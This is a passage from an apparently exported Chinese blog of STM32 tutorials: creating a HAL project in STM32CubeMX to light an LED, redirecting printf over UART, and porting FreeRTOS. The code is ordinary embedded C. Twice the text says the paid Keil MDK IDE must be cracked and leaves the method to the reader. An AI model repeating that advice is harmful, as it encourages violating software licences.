                                    <p>本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：<a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a>。关于 Keil 的更多使用技巧可详看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link highlight">Keil 的使用技巧与问题解决</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1813829584">
                            <a href="#1813829584">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于寄存器或标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>软件安装提示：阅读前请准备好 Keil uVision5 MDK 的安装（可以和 Keil C51 安在一起），软件需破解。安装和破解过程不再赘述。Keil 的一些使用技巧可以看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link highlight">Keil 的使用技巧与问题解决</a></p>
<p>解决方法见：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link highlight">Keil 的使用技巧与问题解决</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1401105135" class="record">
            <header>
                <h1 class="record-title">STM32 工程的创建 - 基于 HAL 库</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('Keil');">Keil</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('HAL');">HAL</button>
                    
                    <button class="btn" onclick="activeTag('STM32CubeMX');">STM32CubeMX</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/2/2024</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>介绍STM32CubeMX的使用。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>53832aef</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404230833.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>目前 STM32 的开发方式有 3 个层次：</p>
<ol>
<li>基于寄存器方式。极少的人使用这种形式。这种方式最底层、最直接、效率更高，但 STM32 寄存器十分复杂，一般不建议采取这种方式。</li>
<li>基于标准库（库函数）方式。使用 ST 官方提供封装好的函数，通过调用函数间接配置寄存器。这种方式对开发人员比较友好，有利于提高开发效率。</li>
<li>基于 HAL 库方式。HAL 库是 ST 公司目前主力推的开发方式，全称就是 Hardware Abstraction Layer（抽象印象层）。可以使用图形化界面快速配置 STM32，隐藏底层的逻辑。</li>
</ol>
<p>HAL 库的出现比标准库要晚，但其实和标准库一样，都是为了节省程序开发的时期。如果说标准库把实现功能需要配置的寄存器集成了，那么 HAL 库的一些函数甚至可以做到某些特定功能的集成。</p>
<p>HAL 库很好的解决了程序移植的问题，不同型号的 stm32 芯片它的标准库是不一样的，例如在 F4 上开发的程序移植到 F3 上是不能通用的，而使用 HAL 库，只要使用的是相通的外设，程序基本可以完全复制粘贴。</p>
<p>ST 公司研发的 STMcube 软件可以通过图形化的配置功能，直接生成整个使用 HAL 库的工程文件。但它同时也存在执行效率的低下的问题。</p>
<blockquote>
<p>更多区别可参阅：<a href="https://blog.csdn.net/qq_44403143/article/details/117650293">STM32中HAL库与标准库的区别_stm32标准库和hal库有什么区别-CSDN博客</a></p>
</blockquote>
<p>本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：<a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a>。关于 Keil 的更多使用技巧可详看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link ">Keil 的使用技巧与问题解决</a>。</p>
<p>本文使用的工具材料有：</p>
<ul>
<li>ST-Link</li>
<li>STM32（这里以 STM32F103C8T6 最小核心板为例）</li>
<li>杜邦线若干</li>
</ul>
<h1>软件安装</h1>
<ol>
<li>安装 JRE（Java 运行环境）。选择 64 位的安装。官网：<a href="https://www.java.com/en/download/">Download Java for Windows</a>。以前装过就不用装。</li>
<li>安装 STM32CubeMX。官网安装：<a href="https://www.st.com/content/st_com/en/stm32cubemx.html#st-get-software">STM32CubeMX: Graphical tool - STMicroelectronics - STMicroelectronics</a>。如果没有账号请提前注册 ST 公司的账号。</li>
<li>安装 Keil5 MDK。Keil5 是收费软件，使用需破解。安装和破解方法请自行搜索。</li>
</ol>
<h1>HAL 库安装</h1>
<p>打开 STM32CubeMX。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402204523.webp" alt="image.png"></p>
<p>建议改一下仓库路径，改到 C 盘以外的地方：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402204606.webp" alt="image.png|475"></p>
<p>点击 OK 返回。然后继续点击 Help 下的软件包管理：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402204649.webp" alt="image.png|437"></p>
<p>选择 F1 系列进行下载：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402204817.webp" alt="image.png|500"></p>
<h1>新建工程</h1>
<p>点击按钮新建工程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402205411.webp" alt="image.png|500"></p>
<p>选择型号：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402205649.webp" alt="image.png"></p>
<h1>引脚选择</h1>
<p>我们打算点亮最小核心板上 PC13 连接的 LED 灯。在可视化界面中点击 PC13 引脚，选择 GPIO_Output：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402205925.webp" alt="image.png|575"></p>
<p>引脚的颜色说明：</p>
<ul>
<li>浅黄色：不可配置引脚。比如电源引脚。</li>
<li>橙色：配置了一个 I/O 口的功能，但没有初始化对应的外设。引脚处于 NO MODE 状态。</li>
<li>绿色：表示配置成功。</li>
</ul>
<p>不要忘了设置这个：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402214800.webp" alt="image.png"></p>
<p>否则烧录一次后就烧不了第二次了。（详看：<a href="https://blog.csdn.net/lzy_m/article/details/108019545">在keil 5下ST-LINK无法识别问题的解决_keil5检测不到stlink-CSDN博客</a>）</p>
<h1>时钟配置</h1>
<p>RCC 配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402210822.webp" alt="image.png"></p>
<p>充分利用最小核心板上的时钟，把配置拉满（72MHz）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402210932.webp" alt="image.png"></p>
<h1>工程创建</h1>
<p>进入工程管理界面：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402211249.webp" alt="image.png"></p>
<p>注意不要存在中文路径。</p>
<p>代码生成选项：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402211540.webp" alt="image.png"></p>
<blockquote>
<p>一些选项的说明：<img src="https://cdn.gallery.uuanqin.top/img/20240402220437.webp" alt="image.png"><br>
Copy all uesd libraries into the project folder：将 HAL 库的所有 <code>.c</code> 和 <code>.h</code> 都复制到所建工程中：</p>
<ul>
<li>优点：这样如果后续需要新增其他外设又可能不再用 STM32CubeMX 的时候便会很方便</li>
<li>缺点：体积大，编译时间长<br>
Add necessary library files as reference in the toolchain project configuration file：不复制文件，直接从软件包存放位置导入 <code>.c</code> 和 <code>.h</code></li>
<li>优点：体积小，比较节约硬盘空间</li>
<li>缺点： 复制到其他电脑上或者软件包位置改变，就需要修改相对应的路径</li>
</ul>
</blockquote>
<p>点击生成按钮生成项目：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402211428.webp" alt="image.png"></p>
<blockquote>
<p>一个项目可以多次生成。这意味着我们可以中途重新配置引脚后重新生成。原项目的自己写的代码部分不会消失（前提是按规范写在指定位置。后面会讲。）</p>
</blockquote>
<p>我们可以看到文件夹已经生成：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402212106.webp" alt="image.png|500"></p>
<h1>代码编写</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402212149.webp" alt="image.png"></p>
<p>在魔术棒中配置烧写后自动复位，比较方便：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402212355.webp" alt="image.png"></p>
<p>打开 main.c 文件。大部分初始化函数已经自动生成了。我们的代码必须在注释提示的指定位置中编写，否则下次代码重新生成时，写在指定位置外的代码将被删除。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402212611.webp" alt="image.png"></p>
<p>在 main 函数中 while 循环编写：</p>
<pre><code class="language-c">  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while (1)
  {
	  HAL_GPIO_WritePin(GPIOC,GPIO_PIN_13,(GPIO_PinState)0);
    /* USER CODE END WHILE */

    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
</code></pre>
<p>编译通过后，将 ST-Link 连接到电脑。检查一下 ST-Link 是否检测到。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402215431.webp" alt="image.png"></p>
<blockquote>
<p>如未连接或链接了但无法烧写，请参考 <a href="https://blog.csdn.net/lzy_m/article/details/108019545">在keil 5下ST-LINK无法识别问题的解决_keil5检测不到stlink-CSDN博客</a> 进行解决。</p>
</blockquote>
<p>检查完成后，将代码下载烧写即可。</p>
<h1>后记</h1>
<p>如果还想接着移植 FreeRTOS，可以继续阅读这篇文章：<a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.bilibili.com/video/BV1fS4y1W7Me/">STM32HAL库纯使用向教学，STM32HAL库学习（一）32单片机讲解以及开发环境的配置。_哔哩哔哩_bilibili</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/670038501">一文教你使用STM32CubeMX开发工具 - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/qq_44403143/article/details/117650293">STM32中HAL库与标准库的区别_stm32标准库和hal库有什么区别-CSDN博客</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="1813829584">
                            <a href="#1813829584">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于寄存器或标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：<a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link highlight">STM32 工程的创建 - 基于寄存器或标准库</a>。关于 Keil 的更多使用技巧可详看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link ">Keil 的使用技巧与问题解决</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2115225612">
                            <a href="#2115225612">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <p>如果还想接着移植 FreeRTOS，可以继续阅读这篇文章：<a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link highlight">STM32 移植 FreeRTOS - 基于 HAL 库</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2617906225">
                            <a href="#2617906225">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>Keil 的使用技巧与问题解决</span>
                                
                                <div class="record-links-context hover">
                                    <p>本篇文章介绍使用 STM32CubeMX 创建 STM32 工程的文章，并实现一个 LED 点灯的案例。如果打算使用寄存器或标准库方式创建项目，可移步这篇文章：<a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a>。关于 Keil 的更多使用技巧可详看这篇文章：<a href="#2617906225" title="Keil 的使用技巧与问题解决" class="record-link highlight">Keil 的使用技巧与问题解决</a>。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1813829584">
                            <a href="#1813829584">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 工程的创建 - 基于寄存器或标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>这里介绍基于寄存器或标准库方式创建 STM32 工程（以 STM32F103C8T6 为例，其它型号大差不差），并通过点灯演示示例。基于 HAL 库方式请移步：<a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">STM32 工程的创建 - 基于 HAL 库</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2115225612">
                            <a href="#2115225612">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于 HAL 库</span>
                                
                                <div class="record-links-context hover">
                                    <p>本文介绍使用 STM32CubeMX 创建一个包含 FreeRTOS 的工程。关于 STM32CubeMX 的安装另见：<a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">STM32 工程的创建 - 基于 HAL 库</a>。此外，这篇文章将在 <a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">基础工程</a> 之上直接实现利用 FreeRTOS 进行点灯操作。</p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>C 语言基本语法</li>
<li>STM32 工程创建，详看
<ul>
<li><a href="#1813829584" title="STM32 工程的创建 - 基于寄存器或标准库" class="record-link ">STM32 工程的创建 - 基于寄存器或标准库</a></li>
<li><a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link highlight">STM32 工程的创建 - 基于 HAL 库</a></li>
</ul>
</li>
<li>FreeRTOS 的移植，详看
<ul>
<li><a href="#2165426052" title="STM32 移植 FreeRTOS - 基于标准库" class="record-link ">STM32 移植 FreeRTOS - 基于标准库</a></li>
<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1545394726" class="record">
            <header>
                <h1 class="record-title">串口驱动程序之「发送数据」</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('驱动');">驱动</button>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('USB');">USB</button>
                    
                    <button class="btn" onclick="activeTag('Keil');">Keil</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('HAL');">HAL</button>
                    
                    <button class="btn" onclick="activeTag('串口');">串口</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/2/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404230451.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>一个简单的串口发送数据的驱动程序。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>5c1cda26</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <h1>串口简介</h1>
<p>串口是一种应用十分广泛的通讯接口，串口成本低、容易使用、通信线路简单，可实现两个设备的互相通信。单片机的串口可以使单片机与单片机、单片机与电脑、单片机与各式各样的模块互相通信，极大地扩展了单片机的应用范围，增强了单片机系统的硬件实力。</p>
<p>简单双向串口通信有两根通信线（发送端TX和接收端RX），TX与RX要交叉连接。当只需单向的数据传输时，可以只接一根通信线。当电平标准不一致时，需要加电平转换芯片。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240501152710.webp" alt="image.png|500"></p>
<table>
<thead>
<tr>
<th>STM32</th>
<th>USB-TTL</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>5V</td>
</tr>
<tr>
<td></td>
<td>VCC（和 5V 或 3V3 短接）</td>
</tr>
<tr>
<td></td>
<td>3V3</td>
</tr>
<tr>
<td>RX</td>
<td>TDX</td>
</tr>
<tr>
<td>TX</td>
<td>RXD</td>
</tr>
<tr>
<td>GND</td>
<td>GND</td>
</tr>
<tr>
<td>串口参数：</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>波特率：串口通信的速率</li>
<li>起始位：标志一个数据帧的开始，固定为低电平</li>
<li>数据位：数据帧的有效载荷，1为高电平，0为低电平，低位先行</li>
<li>校验位：用于数据验证，根据数据位计算得来</li>
<li>停止位：用于数据帧间隔，固定为高电平</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240501152819.webp" alt="image.png"></p>
<h1>使用串口输出到电脑</h1>
<p>使用串口时记得勾选 Use MicroLIB：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402232657.webp" alt="image.png"></p>
<p>在 User 文件夹（或其他文件夹）下，新建两个文件：serial.c 和 serial.h（或其它名字，serial 取串口之意），并添加到「组」中。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402225618.webp" alt="image.png"></p>
<h1>基操之重写 printf 和 sprintf</h1>
<h2>HAL</h2>
<pre><code class="language-c">/**************** HAL ********************/
#include &lt;stdio.h&gt; // printf
int fputc(int ch,FILE *f)
{
    uint8_t c[1]={ch};
    HAL_UART_Transmit(&amp;huart1,c,1,2);        //发送消息到串口1
	return ch;
}
// 调用方法 printf(&quot;hello, world!&quot;);


#include &lt;stdarg.h&gt; // sprintf
#define DATA_MAX 256
uint8_t TxBuf[DATA_MAX];
void XXX_Printf(char *format,...)
{
	va_list arg;
	va_start(arg,format);
	vsprintf((char*)TxBuf,format,arg);
	va_end(arg);
	HAL_UART_Transmit(&amp;huart2,TxBuf,strlen((const char*)TxBuf),0xffff); // 发送消息到串口2
}
// 调用方法 XXX_Printf(&quot;hello, world!&quot;);
</code></pre>
<h2>标准库</h2>
<p>serial.h：</p>
<pre><code class="language-c">#ifndef _SERIAL_H
#define _SERIAL_H
#include &quot;stm32f10x.h&quot;                  // Device header
#include &lt;stdio.h&gt; // printf
#include &lt;stdarg.h&gt; // sprinf

void Serial_Init(uint32_t baud);
void Serial_SendByte(uint8_t Byte);
void Serial_SendString(char *str);
void Serial_Printf(char *format,...);
#endif

</code></pre>
<p>serial.c：</p>
<pre><code class="language-c">#include &quot;serial.h&quot;


void Serial_Init(uint32_t baud)
{
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_USART1,ENABLE);
	RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA,ENABLE);
	
	// 发送
	GPIO_InitTypeDef GPIO_InitStructure;
	GPIO_InitStructure.GPIO_Mode=GPIO_Mode_AF_PP; 		// 复用推挽
	GPIO_InitStructure.GPIO_Pin=GPIO_Pin_9;				// 发送
	GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz;
	GPIO_Init(GPIOA,&amp;GPIO_InitStructure);
	// 接收
	GPIO_InitStructure.GPIO_Mode=GPIO_Mode_IPU; 		// 上拉输入
	GPIO_InitStructure.GPIO_Pin=GPIO_Pin_10;			// 接收
	GPIO_InitStructure.GPIO_Speed=GPIO_Speed_50MHz;
	GPIO_Init(GPIOA,&amp;GPIO_InitStructure);
	
	
	USART_InitTypeDef USART_InitStruture;
	USART_InitStruture.USART_BaudRate=baud; 			// 波特率
	USART_InitStruture.USART_HardwareFlowControl=USART_HardwareFlowControl_None;// 不使用流控制
	USART_InitStruture.USART_Mode=USART_Mode_Tx | USART_Mode_Rx; // 同时开启发送和接收
	USART_InitStruture.USART_Parity=USART_Parity_No; 	// 不需要校验位
	USART_InitStruture.USART_StopBits=USART_StopBits_1;	// 1 位停止位
	USART_InitStruture.USART_WordLength=USART_WordLength_8b; // 字长
	USART_Init(USART1,&amp;USART_InitStruture);
	
	// 接收-中断方式
	USART_ITConfig(USART1,USART_IT_RXNE,ENABLE);		//USART_IT_RXNE一旦置1，将会向NVIC申请中断
	NVIC_PriorityGroupConfig(NVIC_PriorityGroup_2);
	NVIC_InitTypeDef NVIC_InitStructure;
	NVIC_InitStructure.NVIC_IRQChannel=USART1_IRQn;
	NVIC_InitStructure.NVIC_IRQChannelCmd=ENABLE;
	NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority=1;
	NVIC_InitStructure.NVIC_IRQChannelSubPriority=1;
	NVIC_Init(&amp;NVIC_InitStructure);
	
	USART_Cmd(USART1,ENABLE);
}

void Serial_SendByte(uint8_t byte)
{
	USART_SendData(USART1,byte); 						// 标志位自动清零
	while(USART_GetFlagStatus(USART1,USART_FLAG_TXE)==RESET);
}

void Serial_SendString(char *str)
{
	uint8_t i;
	for(i=0;str[i]!='\0';i++)
	{
		Serial_SendByte(str[i]);
	}
}


// 移植printf
// fputc原型，是printf的底层。将其重定向到串口
int fputc(int ch,FILE *f){
	Serial_SendByte(ch);
	return ch;
}

</code></pre>
<p>示例程序 main.c：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header
#include &quot;serial.h&quot;
int main(void){
	Serial_Init(115200);
	printf(&quot;Hello World!&quot;);
	while(1){
		
	}
}

</code></pre>
<p>测试：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240402232800.webp" alt="image.png"></p>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">3</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="2165426052">
                            <a href="#2165426052">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32 移植 FreeRTOS - 基于标准库</span>
                                
                                <div class="record-links-context hover">
                                    <p>详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link highlight">串口驱动程序之「发送数据」</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3727808739">
                            <a href="#3727808739">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>STM32+ESP8266+MQTT 实现阿里云温湿度监控及 LED 点灯（FreeRTOS+标准库 or HAL）</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link highlight">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="2867239616">
                            <a href="#2867239616">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_嵌入式);">⬤</span>
                                    
                                </span>
                                
                                <span>串口驱动程序之「不定长字符串的接收」</span>
                                
                                <div class="record-links-context hover">
                                    <ol>
<li>串口 1 连接电脑。<code>printf</code> 重写，输出至串口 1。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link highlight">串口驱动程序之「发送数据」</a></li>
<li>串口 2 连接 ESP8266。<code>ESP8266_Printf</code> 函数重写 <code>sprintf</code>，输出到串口 2。</li>
<li>函数 <code>uint8_t ESP8266_Cmd(uint8_t *cmd,uint8_t *expect_ack,uint16_t waittime)</code> 用于发送 AT 命令，并将收到结果回显至电脑（解注释 printf）。</li>
</ol>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="2115225612" class="record">
            <header>
                <h1 class="record-title">STM32 移植 FreeRTOS - 基于 HAL 库</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>嵌入式</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('FreeRTOS');">FreeRTOS</button>
                    
                    <button class="btn" onclick="activeTag('STM32CubeMX');">STM32CubeMX</button>
                    
                    <button class="btn" onclick="activeTag('STM32');">STM32</button>
                    
                    <button class="btn" onclick="activeTag('HAL');">HAL</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/3/2024</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>7e13c80c</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240404231132.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>STM32CubeMX 可以以更快速的方式移植 FreeRTOS</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>本文介绍使用 STM32CubeMX 创建一个包含 FreeRTOS 的工程。关于 STM32CubeMX 的安装另见：<a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">STM32 工程的创建 - 基于 HAL 库</a>。此外，这篇文章将在 <a href="#1401105135" title="STM32 工程的创建 - 基于 HAL 库" class="record-link ">基础工程</a> 之上直接实现利用 FreeRTOS 进行点灯操作。</p>
<h1>FreeRTOS 的配置</h1>
<p>打开 STM32CubeMX 配置界面：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403224057.webp" alt="image.png|420"></p>
<p>使用 FreeRTOS 时，必须为 HAL 设置一个非 SysTick 定时器作为 HAL 的基础时钟，SysTick 将自动作为 FreeRTOS 的基础时钟。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403224334.webp" alt="image.png"></p>
<p>这里我们选择 V2 接口。V1 和 V2 版本主要的区别在于，V2 兼容支持的硬件更多，内存耗费更多。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403224427.webp" alt="image.png"></p>
<p>配置内核参数：</p>
<ul>
<li>Task and Quenes： 任务与队列的创建。</li>
<li>Timers and Semaphores： 定时器和信号量的创建。</li>
<li>Mutexes： 互斥量的创建。</li>
<li>FreeRTOS Heap Usage： 用于查看堆使用情况。</li>
<li>config parameters： 内核参数设置，用户根据自己的实际应用来裁剪定制 FreeRTOS 内核。</li>
<li>Include parameters： FreeRTOS 部分函数的使能。</li>
<li>User Constants： 相关宏的定义，可以自建一些常量在工程中使用。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403224643.webp" alt="image.png"></p>
<p>点击 GENERATE 生成代码。然后编译一遍确保无误。</p>
<h1>编写任务</h1>
<p>首先保证 main.c 的循环中没有内容。</p>
<pre><code class="language-c">while (1)
{
/* USER CODE END WHILE */
/* USER CODE BEGIN 3 */
}
</code></pre>
<p>找到 <code>freertos.c</code>：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403230136.webp" alt="image.png"></p>
<p>找到我们刚刚指定的任务函数：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240403230204.webp" alt="image.png"></p>
<p>写上翻转灯的逻辑：</p>
<pre><code class="language-c">void led_task_func(void *argument)
{
  /* USER CODE BEGIN led_task_func */
  /* Infinite loop */
  for(;;)
  {
	HAL_GPIO_TogglePin(GPIOC,GPIO_PIN_13);
	osDelay(100);
  }
  /* USER CODE END led_task_func */
}
</code></pre>
<p>编译成功后下载即可。</p>
<h1>本文参考</h1>
<ul>
<li><a href="https://blog.csdn.net/weixin_44793491/article/details/107577711">FreeRTOS+CubeMX系列第一篇——初识FreeRTOS_cubemx freertos-CSDN博客</a></li>
<li><a href="https://www.bilibili.com/read/cv21832686/">STMCubeMX FreeRtos CMSIS_V2创建任务 - 哔哩哔哩 (bilibili.com)</a></li>
